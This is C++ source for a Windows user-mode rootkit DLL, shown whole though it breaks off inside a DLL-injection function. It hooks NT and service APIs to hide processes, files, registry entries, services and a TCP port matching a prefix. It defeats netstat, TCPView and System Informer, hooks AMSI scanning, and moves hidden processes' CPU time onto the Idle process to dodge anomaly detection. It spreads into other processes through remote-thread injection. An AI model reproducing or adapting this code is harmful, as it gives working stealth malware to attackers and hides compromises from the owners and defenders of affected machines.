// dllmain.cpp — user-mode rootkit DLL
// Prefix-based hiding: the DLL reads its own filename as the hidden prefix.
// Everything (process, file, registry key/value) whose name STARTS WITH that
// prefix is hidden from the relevant NT APIs.
//
// Config: {DLL_DIR}\{prefix}.cfg  — contains a single line: the TCP port to hide.
//
// Thread safety: DetourUpdateThread is called for ALL threads in the process
// (not just the hook thread) before DetourTransactionCommit, which prevents
// crashes in multi-threaded processes such as explorer.exe.

#include "pch.h"
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <detours.h>
#include <iphlpapi.h>
#include <tcpmib.h>
#include <winsock2.h>
#include <winsvc.h>

// Detours is compiled from source directly in the project — no detours.lib needed

// ---- compatibility / missing defines ----
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif
#ifndef STATUS_OBJECT_NAME_NOT_FOUND
#define STATUS_OBJECT_NAME_NOT_FOUND ((NTSTATUS)0xC0000034L)
#endif
#ifndef STATUS_NO_MORE_ENTRIES
#define STATUS_NO_MORE_ENTRIES ((NTSTATUS)0x8000001AL)
#endif

#ifndef FileDirectoryInformation
#define FileDirectoryInformation           1
#endif
#ifndef FileFullDirectoryInformation
#define FileFullDirectoryInformation       2
#endif
#ifndef FileBothDirectoryInformation
#define FileBothDirectoryInformation       3
#endif
#ifndef FileNamesInformation
#define FileNamesInformation               12
#endif
#ifndef FileIdBothDirectoryInformation
#define FileIdBothDirectoryInformation     37
#endif
#ifndef FileIdFullDirectoryInformation
#define FileIdFullDirectoryInformation     38
#endif
#ifndef FileIdExtdDirectoryInformation
#define FileIdExtdDirectoryInformation     39
#endif

// ---- small structures ----
typedef struct _KEY_BASIC_INFORMATION {
    LARGE_INTEGER LastWriteTime;
    ULONG TitleIndex;
    ULONG NameLength;
    WCHAR Name[1];
} KEY_BASIC_INFORMATION, * PKEY_BASIC_INFORMATION;

typedef struct _KEY_VALUE_BASIC_INFORMATION {
    ULONG TitleIndex;
    ULONG Type;
    ULONG NameLength;
    WCHAR Name[1];
} KEY_VALUE_BASIC_INFORMATION, * PKEY_VALUE_BASIC_INFORMATION;

typedef struct _KEY_NAME_INFORMATION {
    ULONG NameLength;
    WCHAR Name[1];
} KEY_NAME_INFORMATION, * PKEY_NAME_INFORMATION;

typedef struct _KEY_VALUE_FULL_INFORMATION {
    ULONG TitleIndex;
    ULONG Type;
    ULONG DataOffset;
    ULONG DataLength;
    ULONG NameLength;
    WCHAR Name[1];
} KEY_VALUE_FULL_INFORMATION, * PKEY_VALUE_FULL_INFORMATION;

typedef struct _FILE_DIRECTORY_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_DIRECTORY_INFORMATION, * PFILE_DIRECTORY_INFORMATION;

typedef struct _FILE_BOTH_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    WCHAR FileName[1];
} FILE_BOTH_DIR_INFORMATION, * PFILE_BOTH_DIR_INFORMATION;

typedef struct _FILE_ID_BOTH_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    LARGE_INTEGER FileId;
    WCHAR FileName[1];
} FILE_ID_BOTH_DIR_INFORMATION, * PFILE_ID_BOTH_DIR_INFORMATION;

typedef enum _KEY_INFORMATION_CLASS {
    KeyBasicInformation = 0,
    KeyNodeInformation = 1,
    KeyFullInformation = 2,
    KeyNameInformation = 3,
    KeyCachedInformation = 4,
    KeyFlagsInformation = 5,
    KeyVirtualizationInformation = 6,
    KeyHandleTagsInformation = 7,
    KeyTrustInformation = 8,
    KeyLayerInformation = 9
} KEY_INFORMATION_CLASS;

typedef enum _KEY_VALUE_INFORMATION_CLASS {
    KeyValueBasicInformation = 0,
    KeyValueFullInformation = 1,
    KeyValuePartialInformation = 2,
    KeyValueFullInformationAlign64 = 3,
    KeyValuePartialInformationAlign64 = 4,
    KeyValueLayerInformation = 5
} KEY_VALUE_INFORMATION_CLASS;

// ---- NT prototypes typedefs ----
typedef NTSTATUS(NTAPI* NtQuerySystemInformation_t)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* NtQueryDirectoryFile_t)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS, BOOLEAN, PUNICODE_STRING, BOOLEAN);
typedef NTSTATUS(NTAPI* NtQueryDirectoryFileEx_t)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS, BOOLEAN, PUNICODE_STRING);
typedef NTSTATUS(NTAPI* NtQueryKey_t)(HANDLE, KEY_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* NtEnumerateKey_t)(HANDLE, ULONG, KEY_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* NtEnumerateValueKey_t)(HANDLE, ULONG, KEY_VALUE_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* NtGetNextProcess_t)(HANDLE, ACCESS_MASK, ULONG, ULONG, PHANDLE);
typedef NTSTATUS(NTAPI* NtDeviceIoControlFile_t)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, ULONG, PVOID, ULONG, PVOID, ULONG);
typedef NTSTATUS(NTAPI* NtResumeThread_t)(HANDLE, PULONG);
typedef NTSTATUS(NTAPI* NtQueryObject_t)(HANDLE, ULONG, PVOID, ULONG, PULONG);
typedef HRESULT (WINAPI* AmsiScanBuffer_t)(PVOID, PVOID, ULONG, LPCWSTR, PVOID, PVOID*);
typedef NTSTATUS(NTAPI* NtUserBuildHwndList_t)(HDESK, HWND, BOOL, BOOL, DWORD, ULONG, HWND*, PULONG);
typedef BOOL(WINAPI* EnumServicesStatusA_t)(SC_HANDLE, DWORD, DWORD, LPENUM_SERVICE_STATUSA, DWORD, LPDWORD, LPDWORD, LPDWORD);
typedef BOOL(WINAPI* EnumServicesStatusW_t)(SC_HANDLE, DWORD, DWORD, LPENUM_SERVICE_STATUSW, DWORD, LPDWORD, LPDWORD, LPDWORD);
typedef BOOL(WINAPI* EnumServiceGroupW_t)(SC_HANDLE, DWORD, DWORD, LPBYTE, DWORD, LPDWORD, LPDWORD, LPDWORD, LPVOID);
typedef BOOL(WINAPI* EnumServicesStatusExA_t)(SC_HANDLE, SC_ENUM_TYPE, DWORD, DWORD, LPBYTE, DWORD, LPDWORD, LPDWORD, LPDWORD, LPCSTR);
typedef BOOL(WINAPI* EnumServicesStatusExW_t)(SC_HANDLE, SC_ENUM_TYPE, DWORD, DWORD, LPBYTE, DWORD, LPDWORD, LPDWORD, LPDWORD, LPCWSTR);

// NSI (Network Store Interface) — used by TCPView and netstat to read TCP/UDP tables
#define IOCTL_NSI_GETALLPARAM  0x12001b
#define DEVICE_NSI             L"\\Device\\Nsi"
// KPH (KProcessHacker) — System Informer admin kernel driver
#define IOCTL_KPH_COMMS        0x00222003
#define DEVICE_KPH             L"\\Device\\KSystemInformer"
#define DEVICE_KPH2            L"\\Device\\KProcessHacker2"

// NSI (Network Store Interface) structs
typedef enum _NSI_PARAM_TYPE { NsiUdp = 1, NsiTcp = 3 } NSI_PARAM_TYPE;

typedef struct _NSI_TCP_SUBENTRY {
    BYTE  Reserved1[2];
    USHORT Port;          // big-endian
    ULONG  IpAddress;
    BYTE   IpAddress6[16];
    BYTE   Reserved2[4];
} NSI_TCP_SUBENTRY;
typedef struct _NSI_TCP_ENTRY { NSI_TCP_SUBENTRY Local; NSI_TCP_SUBENTRY Remote; } NSI_TCP_ENTRY, *PNSI_TCP_ENTRY;
typedef struct _NSI_UDP_ENTRY {
    BYTE  Reserved1[2];
    USHORT Port;
    ULONG  IpAddress;
    BYTE   IpAddress6[16];
    BYTE   Reserved2[4];
} NSI_UDP_ENTRY, *PNSI_UDP_ENTRY;
typedef struct _NSI_STATUS_ENTRY { ULONG State; BYTE Reserved[8]; } NSI_STATUS_ENTRY, *PNSI_STATUS_ENTRY;
typedef struct _NSI_PROC_ENTRY {
    ULONG UdpProcessId; ULONG Res1; ULONG Res2;
    ULONG TcpProcessId; ULONG Res3; ULONG Res4; ULONG Res5; ULONG Res6;
} NSI_PROC_ENTRY, *PNSI_PROC_ENTRY;

typedef struct _NSI_PARAM {
    SIZE_T         Reserved1;
    SIZE_T         Reserved2;
    PVOID          ModuleId;
    NSI_PARAM_TYPE Type;
    ULONG          Reserved3;
    ULONG          Reserved4;
    PVOID          Entries;
    SIZE_T         EntrySize;
    PVOID          Reserved5;
    SIZE_T         Reserved6;
    PVOID          StatusEntries;
    SIZE_T         StatusEntrySize;
    PVOID          ProcessEntries;
    SIZE_T         ProcessEntrySize;
    SIZE_T         Count;
} NSI_PARAM, *PNSI_PARAM;

// ---- originals ----
static NtQuerySystemInformation_t  TrueNtQuerySystemInformation  = nullptr;
static NtQueryDirectoryFile_t      TrueNtQueryDirectoryFile      = nullptr;
static NtQueryDirectoryFileEx_t    TrueNtQueryDirectoryFileEx    = nullptr;
static NtQueryKey_t                TrueNtQueryKey                = nullptr;
static NtEnumerateKey_t            TrueNtEnumerateKey            = nullptr;
static NtEnumerateValueKey_t       TrueNtEnumerateValueKey       = nullptr;
static NtGetNextProcess_t          TrueNtGetNextProcess          = nullptr;
static NtDeviceIoControlFile_t     TrueNtDeviceIoControlFile     = nullptr;
static NtResumeThread_t            TrueNtResumeThread            = nullptr;
static NtQueryObject_t             TrueNtQueryObject             = nullptr;
static AmsiScanBuffer_t            TrueAmsiScanBuffer            = nullptr;
static NtUserBuildHwndList_t       TrueNtUserBuildHwndList       = nullptr;
static EnumServicesStatusA_t       TrueEnumServicesStatusA       = nullptr;
static EnumServicesStatusW_t       TrueEnumServicesStatusW       = nullptr;
static EnumServiceGroupW_t         TrueEnumServiceGroupW         = nullptr;
static EnumServicesStatusExA_t     TrueEnumServicesStatusExA     = nullptr;
static EnumServicesStatusExW_t     TrueEnumServicesStatusExW     = nullptr;
static EnumServicesStatusExW_t     TrueEnumServicesStatusExW2    = nullptr; // sechost.dll

// ---- logging (always enabled — check %TEMP%\ntqsi_hook.log) ----
// To disable: wrap with #ifdef _DEBUG / #endif and add no-op stubs below.
static CRITICAL_SECTION g_logCS;
static HANDLE g_hLogFile = INVALID_HANDLE_VALUE;

static void LogInit()
{
    InitializeCriticalSection(&g_logCS);
    CHAR tmpPath[MAX_PATH] = { 0 };
    if (GetTempPathA(MAX_PATH, tmpPath) == 0) strcpy_s(tmpPath, ".\\");
    CHAR logFile[MAX_PATH] = { 0 };
    sprintf_s(logFile, "%sntqsi_hook.log", tmpPath);
    g_hLogFile = CreateFileA(logFile, FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (g_hLogFile != INVALID_HANDLE_VALUE) {
        const char* hdr = "=== ntqsi_hook log started ===\r\n";
        DWORD w; WriteFile(g_hLogFile, hdr, (DWORD)strlen(hdr), &w, NULL);
    }
}

static void LogClose()
{
    if (g_hLogFile != INVALID_HANDLE_VALUE) {
        const char* foot = "=== ntqsi_hook log ended ===\r\n";
        DWORD w; WriteFile(g_hLogFile, foot, (DWORD)strlen(foot), &w, NULL);
        CloseHandle(g_hLogFile);
        g_hLogFile = INVALID_HANDLE_VALUE;
    }
    DeleteCriticalSection(&g_logCS);
}

static void Logf(const char* fmt, ...)
{
    if (g_hLogFile == INVALID_HANDLE_VALUE) return;
    EnterCriticalSection(&g_logCS);
    char buf[2048];
    unsigned long long t = GetTickCount64();
    int n = sprintf_s(buf, "[%016llu] ", t);
    va_list ap; va_start(ap, fmt);
    vsnprintf_s(buf + n, sizeof(buf) - n, _TRUNCATE, fmt, ap);
    va_end(ap);
    strcat_s(buf, "\r\n");
    DWORD w; WriteFile(g_hLogFile, buf, (DWORD)strlen(buf), &w, NULL);
    LeaveCriticalSection(&g_logCS);
}

// ── Global state ────────────────────────────────────────────────────────────
static HINSTANCE g_hInstance    = NULL;
static char      g_prefix[64]   = { 0 };        // lowercase ANSI prefix (from DLL filename)
static size_t    g_prefixLen    = 0;
static char      g_hollowProc[64] = { 0 };      // optional hollow-target process name (no .exe)
static size_t    g_hollowProcLen  = 0;
static USHORT    g_hiddenPort   = 0;
static WCHAR     g_dllPath[MAX_PATH]   = { 0 };  // full path of x64 DLL (for child injection)
static WCHAR     g_dllPath32[MAX_PATH] = { 0 };  // full path of x86 DLL (injected into WOW64 children)

// KPH handle cache — avoid calling NtQueryObject on every IOCTL
#define KPH_CACHE_SIZE 16
static HANDLE    g_kphHandles[KPH_CACHE_SIZE] = { 0 };
static LONG      g_kphHandleCount = 0;
static CRITICAL_SECTION g_kphCS;

// ── Prefix matching ─────────────────────────────────────────────────────────

// Returns true if nameA (already lowercase) starts with g_prefix
static bool PrefixMatch(const char* nameA)
{
    if (!nameA || g_prefixLen == 0) return false;
    return _strnicmp(nameA, g_prefix, g_prefixLen) == 0;
}

// Returns true if the process name should be hidden (prefix match OR hollow target match)
static bool ShouldHideProcess(const char* nameA)
{
    if (!nameA) return false;
    if (PrefixMatch(nameA)) return true;
    if (g_hollowProcLen > 0 && _strnicmp(nameA, g_hollowProc, g_hollowProcLen) == 0) return true;
    return false;
}

static void UnicodeToLowerAnsiSafe(const WCHAR* wname, ULONG wlenBytes, char* out, size_t outSize)
{
    if (!out) return;
    out[0] = '\0';
    if (!wname || wlenBytes == 0) return;
    int wcount = (int)(wlenBytes / sizeof(WCHAR));
    if (wcount <= 0) return;
    int len = WideCharToMultiByte(CP_ACP, 0, wname, wcount, out, (int)outSize - 1, NULL, NULL);
    if (len <= 0) { out[0] = '\0'; return; }
    out[len] = '\0';
    for (int i = 0; i < len; ++i) out[i] = (char)tolower(out[i]);
}

// Returns true if the Unicode name (not null-terminated, length in bytes) starts with g_prefix
static bool PrefixMatchW(const WCHAR* nameW, ULONG lenBytes)
{
    if (!nameW || lenBytes == 0 || g_prefixLen == 0) return false;
    char nameA[MAX_PATH] = { 0 };
    ULONG clamp = lenBytes;
    if (clamp > (ULONG)((MAX_PATH - 1) * sizeof(WCHAR))) clamp = (ULONG)((MAX_PATH - 1) * sizeof(WCHAR));
    UnicodeToLowerAnsiSafe(nameW, clamp, nameA, sizeof(nameA));
    return PrefixMatch(nameA);
}

// ── Config loading ───────────────────────────────────────────────────────────
// Derives the hidden prefix from the DLL's own filename (strips .dll extension).
// Reads port number from {DLL_DIR}\{prefix}.cfg.
// x86 DLL is named "{prefix}32.dll" — strips "32" suffix and falls back to
// the x64 cfg so both DLLs share the same prefix and config.

// Returns a specific line (0-based) from buf, NUL-terminated, trimmed of CR/LF/spaces.
static void GetCfgLine(const char* buf, int lineNum, char* out, size_t outSize)
{
    out[0] = '\0';
    const char* p = buf;
    for (int i = 0; i < lineNum; i++) {
        p = strchr(p, '\n');
        if (!p) return;
        p++;
    }
    const char* end = strchr(p, '\n');
    size_t len = end ? (size_t)(end - p) : strlen(p);
    if (len >= outSize) len = outSize - 1;
    strncpy_s(out, outSize, p, len);
    char* e = out + strlen(out) - 1;
    while (e >= out && (*e == '\r' || *e == '\n' || *e == ' ')) *e-- = '\0';
}

static void LoadConfig()
{
    WCHAR dllPath[MAX_PATH] = { 0 };
    GetModuleFileNameW(g_hInstance, dllPath, MAX_PATH);

    WCHAR* lastSep = wcsrchr(dllPath, L'\\');
    WCHAR* baseName = lastSep ? lastSep + 1 : dllPath;

    // Strip .dll extension from basename to get the raw prefix (may include "32" suffix)
    WCHAR prefixW[64] = { 0 };
    wcsncpy_s(prefixW, baseName, _TRUNCATE);
    WCHAR* dot = wcsrchr(prefixW, L'.');
    if (dot) *dot = L'\0';
    for (int i = 0; prefixW[i]; i++)
        if (prefixW[i] >= L'A' && prefixW[i] <= L'Z')
            prefixW[i] += (L'a' - L'A');

    // Convert raw prefix to ANSI
    g_prefix[0] = '\0';
    int aLen = WideCharToMultiByte(CP_ACP, 0, prefixW, -1, g_prefix, sizeof(g_prefix) - 1, NULL, NULL);
    if (aLen > 0 && g_prefix[aLen - 1] == '\0') aLen--;
    g_prefixLen = (size_t)(aLen > 0 ? aLen : strlen(g_prefix));

    // Build cfg path: {DLL_DIR}\{rawPrefix}.cfg
    WCHAR cfgPath[MAX_PATH] = { 0 };
    if (lastSep) {
        size_t dirLen = (size_t)(lastSep - dllPath) + 1;
        wcsncpy_s(cfgPath, dllPath, dirLen);
        wcsncat_s(cfgPath, prefixW, _TRUNCATE);
        wcsncat_s(cfgPath, L".cfg", _TRUNCATE);
    }

    // x86 DLL fallback: "aahah32.dll" → look for "aahah.cfg" and use "aahah" as prefix.
    // Strip any trailing "32" from the prefix so the x86 DLL hides the same things as x64.
    if (GetFileAttributesW(cfgPath) == INVALID_FILE_ATTRIBUTES
        && g_prefixLen > 2 && g_prefix[g_prefixLen - 1] == '2' && g_prefix[g_prefixLen - 2] == '3')
    {
        WCHAR cfgPath2[MAX_PATH] = { 0 };
        if (lastSep) {
            size_t dirLen = (size_t)(lastSep - dllPath) + 1;
            wcsncpy_s(cfgPath2, dllPath, dirLen);
            WCHAR prefixShort[64] = { 0 };
            wcsncpy_s(prefixShort, prefixW, _TRUNCATE);
            size_t pLen = wcslen(prefixShort);
            if (pLen > 2) prefixShort[pLen - 2] = L'\0'; // strip "32"
            wcsncat_s(cfgPath2, prefixShort, _TRUNCATE);
            wcsncat_s(cfgPath2, L".cfg", _TRUNCATE);
        }
        if (GetFileAttributesW(cfgPath2) != INVALID_FILE_ATTRIBUTES) {
            wcscpy_s(cfgPath, cfgPath2);
            // Update prefix: strip "32" so we hide "aahah*" not "aahah32*"
            g_prefix[g_prefixLen - 2] = '\0';
            g_prefixLen -= 2;
            Logf("LoadConfig: x86 DLL — prefix stripped to '%s', using '%ls'", g_prefix, cfgPath);
        }
    }

    HANDLE hFile = CreateFileW(cfgPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        char buf[256] = { 0 };
        DWORD r = 0;
        ReadFile(hFile, buf, sizeof(buf) - 1, &r, NULL);
        CloseHandle(hFile);
        buf[r] = '\0';

        // Line 0: TCP port to hide
        char portStr[16] = { 0 };
        GetCfgLine(buf, 0, portStr, sizeof(portStr));
        int p = atoi(portStr);
        if (p > 0 && p < 65536) g_hiddenPort = (USHORT)p;

        // Line 1: hollow-target process name (no .exe)
        char hollow[64] = { 0 };
        GetCfgLine(buf, 1, hollow, sizeof(hollow));
        if (hollow[0]) {
            strcpy_s(g_hollowProc, hollow);
            for (int i = 0; g_hollowProc[i]; i++)
                if (g_hollowProc[i] >= 'A' && g_hollowProc[i] <= 'Z')
                    g_hollowProc[i] += ('a' - 'A');
            g_hollowProcLen = strlen(g_hollowProc);
        }

        Logf("LoadConfig: prefix='%s' port=%d hollow='%s'", g_prefix, (int)g_hiddenPort, g_hollowProc);
    }
    else {
        Logf("LoadConfig: no cfg at '%ls' (GLE=%lu) — port/hollow hiding disabled", cfgPath, GetLastError());
    }
}

// ── Process hook: NtQuerySystemInformation (hide processes by prefix) ────────
// Full SYSTEM_PROCESS_INFORMATION layout (winternl.h only has stub fields).
// Offsets verified against Windows 10/11 ntdll. Fields up to ImageName are stable.
typedef struct _PROC_INFO_FULL {
    ULONG          NextEntryOffset;
    ULONG          NumberOfThreads;
    LARGE_INTEGER  SpareLi[3];       // WorkingSetPrivateSize, HardFaultCount, ...
    LARGE_INTEGER  CreateTime;
    LARGE_INTEGER  UserTime;
    LARGE_INTEGER  KernelTime;
    UNICODE_STRING ImageName;
    LONG           BasePriority;
    HANDLE         UniqueProcessId;
} PROC_INFO_FULL, *PPROC_INFO_FULL;

// Filter a SYSTEM_PROCESS_INFORMATION list in-place.
// Works for SystemProcessInformation (5), SystemExtendedProcessInformation (57),
// and SystemFullProcessInformation (148) — all share the same header layout.
static void FilterProcessList(PVOID SystemInformation)
{
    if (!SystemInformation || g_prefixLen == 0) return;

    PPROC_INFO_FULL cur  = (PPROC_INFO_FULL)SystemInformation;
    PPROC_INFO_FULL prev = NULL;

    LARGE_INTEGER hiddenKernelTime = { 0 };
    LARGE_INTEGER hiddenUserTime   = { 0 };

    while (TRUE) {
        char nameA[MAX_PATH] = { 0 };
        if (cur->ImageName.Buffer && cur->ImageName.Length > 0) {
            const WCHAR* src  = cur->ImageName.Buffer;
            const WCHAR* last = src;
            int cnt = cur->ImageName.Length / sizeof(WCHAR);
            for (int i = 0; i < cnt; ++i)
                if (src[i] == L'\\' || src[i] == L'/') last = src + i + 1;
            int wCnt = cnt - (int)(last - src);
            if (wCnt > 0)
                WideCharToMultiByte(CP_ACP, 0, last, wCnt, nameA, MAX_PATH - 1, NULL, NULL);
            for (int i = 0; nameA[i]; ++i) nameA[i] = (char)tolower(nameA[i]);
        }

        if (nameA[0] && ShouldHideProcess(nameA)) {
            Logf("Hiding process: %s (PID=%llu)", nameA, (ULONG64)(ULONG_PTR)cur->UniqueProcessId);
            hiddenKernelTime.QuadPart += cur->KernelTime.QuadPart;
            hiddenUserTime.QuadPart   += cur->UserTime.QuadPart;

            if (prev) {
                prev->NextEntryOffset = cur->NextEntryOffset
                    ? prev->NextEntryOffset + cur->NextEntryOffset : 0;
            }
            // Don't advance prev — current entry removed
        } else {
            prev = cur;
        }

        if (cur->NextEntryOffset == 0) break;
        cur = (PPROC_INFO_FULL)((PUCHAR)cur + cur->NextEntryOffset);
    }

    // Add hidden CPU time to System Idle Process (PID 0) — prevents anomaly detection
    if (hiddenKernelTime.QuadPart == 0 && hiddenUserTime.QuadPart == 0) return;
    cur = (PPROC_INFO_FULL)SystemInformation;
    while (TRUE) {
        if ((ULONG_PTR)cur->UniqueProcessId == 0) {
            cur->KernelTime.QuadPart += hiddenKernelTime.QuadPart;
            cur->UserTime.QuadPart   += hiddenUserTime.QuadPart;
            break;
        }
        if (cur->NextEntryOffset == 0) break;
        cur = (PPROC_INFO_FULL)((PUCHAR)cur + cur->NextEntryOffset);
    }
}

NTSTATUS NTAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
{
    ULONG retLen = 0;
    NTSTATUS st = TrueNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, &retLen);
    if (ReturnLength) *ReturnLength = retLen;

    if (NT_SUCCESS(st) && SystemInformation && g_prefixLen > 0) {
        // Class 5 = SystemProcessInformation
        // Class 57 = SystemExtendedProcessInformation (same header, used by System Informer)
        // Class 148 = SystemFullProcessInformation (same header)
        int cls = (int)SystemInformationClass;
        if (cls == 5 || cls == 57 || cls == 148)
            FilterProcessList(SystemInformation);
    }
    return st;
}

// ── NtGetNextProcess hook (hide processes by prefix) ─────────────────────────
#ifndef _countof
#define _countof(_Array) (sizeof(_Array) / sizeof((_Array)[0]))
#endif

NTSTATUS NTAPI HookedNtGetNextProcess(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess, ULONG HandleAttributes, ULONG Flags, PHANDLE NewProcessHandle)
{
    // Iterate past hidden processes instead of stopping — the old approach returned
    // STATUS_NO_MORE_ENTRIES on the hidden process, which cut off the entire rest of
    // the process list (Task Manager showed fewer processes than expected).
    HANDLE iterHandle = ProcessHandle; // "start after" cursor; we don't own ProcessHandle
    bool ownsIter = false;             // true when iterHandle is a handle we opened
    NTSTATUS st;

    for (;;) {
        st = TrueNtGetNextProcess(iterHandle, DesiredAccess, HandleAttributes, Flags, NewProcessHandle);

        // Close intermediate hidden-process handle from the previous iteration
        if (ownsIter) { CloseHandle(iterHandle); ownsIter = false; }

        if (!NT_SUCCESS(st) || !NewProcessHandle || !*NewProcessHandle) return st;

        WCHAR imagePath[MAX_PATH] = { 0 };
        DWORD size = _countof(imagePath);
        bool hide = false;
        if (QueryFullProcessImageNameW(*NewProcessHandle, 0, imagePath, &size)) {
            WCHAR* base = wcsrchr(imagePath, L'\\');
            const WCHAR* nameW = base ? base + 1 : imagePath;
            char nameA[MAX_PATH] = { 0 };
            WideCharToMultiByte(CP_ACP, 0, nameW, -1, nameA, sizeof(nameA), NULL, NULL);
            for (int i = 0; nameA[i]; i++) nameA[i] = (char)tolower(nameA[i]);
            hide = ShouldHideProcess(nameA);
            if (hide) Logf("Hiding process via NtGetNextProcess: %s", nameA);
        }

        if (!hide) return st; // visible process — return it to the caller

        // Hidden — advance past it: reuse its handle as the next iteration cursor
        iterHandle = *NewProcessHandle;
        ownsIter = true;
        *NewProcessHandle = NULL;
    }
}

// Processes that must never be injected — crashing them causes BSOD / logon loss.
static const char* const g_resumeBlacklist[] = {
    "csrss.exe", "smss.exe", "lsass.exe", "lsaiso.exe",
    "wininit.exe", "services.exe", "dwm.exe", "fontdrvhost.exe",
    "audiodg.exe", "MsMpEng.exe", "SgrmBroker.exe", NULL
};

static bool IsBlacklisted(DWORD pid)
{
    WCHAR img[MAX_PATH] = { 0 };
    DWORD sz = MAX_PATH;
    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!h) return false;
    QueryFullProcessImageNameW(h, 0, img, &sz);
    CloseHandle(h);
    WCHAR* base = wcsrchr(img, L'\\');
    const WCHAR* nameW = base ? base + 1 : img;
    char nameA[64] = { 0 };
    WideCharToMultiByte(CP_ACP, 0, nameW, -1, nameA, sizeof(nameA), NULL, NULL);
    for (int i = 0; g_resumeBlacklist[i]; i++)
        if (_stricmp(nameA, g_resumeBlacklist[i]) == 0) return true;
    return false;
}

static bool IsBlacklistedName(const WCHAR* exeName)
{
    char nameA[64] = { 0 };
    WideCharToMultiByte(CP_ACP, 0, exeName, -1, nameA, sizeof(nameA), NULL, NULL);
    for (int i = 0; g_resumeBlacklist[i]; i++)
        if (_stricmp(nameA, g_resumeBlacklist[i]) == 0) return true;
    return false;
}

static bool IsElevated()
{
    HANDLE tok = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok)) return false;
    TOKEN_ELEVATION elev = {};
    DWORD sz = sizeof(elev);
    bool result = GetTokenInformation(tok, TokenElevation, &elev, sizeof(elev), &sz)
                  && elev.TokenIsElevated;
    CloseHandle(tok);
    return result;
}

// Check if our DLL is already loaded in a target process (prevents double-injection).
// Uses module snapshot — works when caller is elevated.
static bool IsAlreadyInjected(DWORD pid)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if (snap == INVALID_HANDLE_VALUE) return false; // can't read → try to inject
    MODULEENTRY32W me = { sizeof(me) };
    bool found = false;
    if (Module32FirstW(snap, &me)) {
        do {
            if (_wcsicmp(me.szExePath, g_dllPath) == 0 ||
                (g_dllPath32[0] && _wcsicmp(me.szExePath, g_dllPath32) == 0)) {
                found = true;
                break;
            }
        } while (Module32NextW(snap, &me));
    }
    CloseHandle(snap);
    return found;
}

static void InjectIntoProcess(DWORD pid)
{
    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    if (!hK32) return;
    LPTHREAD_START_ROUTINE pLoadLibW = (LPTHREAD_START_ROUTINE)GetProcAddress(hK32, "LoadLibraryW");
    if (!pLoadLibW) return;

    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE
                               | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc) {
        Logf("InjResumeInject: OpenProcess PID=%lu failed GLE=%lu", pid, GetLastError());
        return;
    }

    // Select DLL based on target bitness
    BOOL bWow64 = FALSE;
    IsWow64Process(hProc, &bWow64);

    const WCHAR* dllToInject = nullptr;
    if (bWow64) {
        if (!g_dllPath32[0]) {
            Logf("InjResumeInject: WOW64 PID=%lu, skip (no x86 DLL)", pid);
            CloseHandle(hProc); return;
        }
        dllToInject = g_dllPath32;
    } else {
        if (!g_dllPath[0]) {
            CloseHandle(hProc); return;
        }
        dllToInject = g_dllPath;
    }

    SIZE_T pathLen = (wcslen(dllToInject) + 1) * sizeof(WCHAR);
    PVOID remote = VirtualAllocEx(hProc, NULL, pathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (remote) {
        SIZE_T written = 0;
        WriteProcessMemory(hProc, remote, dllToInject, pathLen, &written);
        if (written == pathLen) {
            HANDLE hT = CreateRemoteThread(hProc, NULL, 0, pLoadLibW, remote, 0, NULL);
            if (hT) {
                WaitForSingleObject(hT, 500);
                CloseHandle(hT);
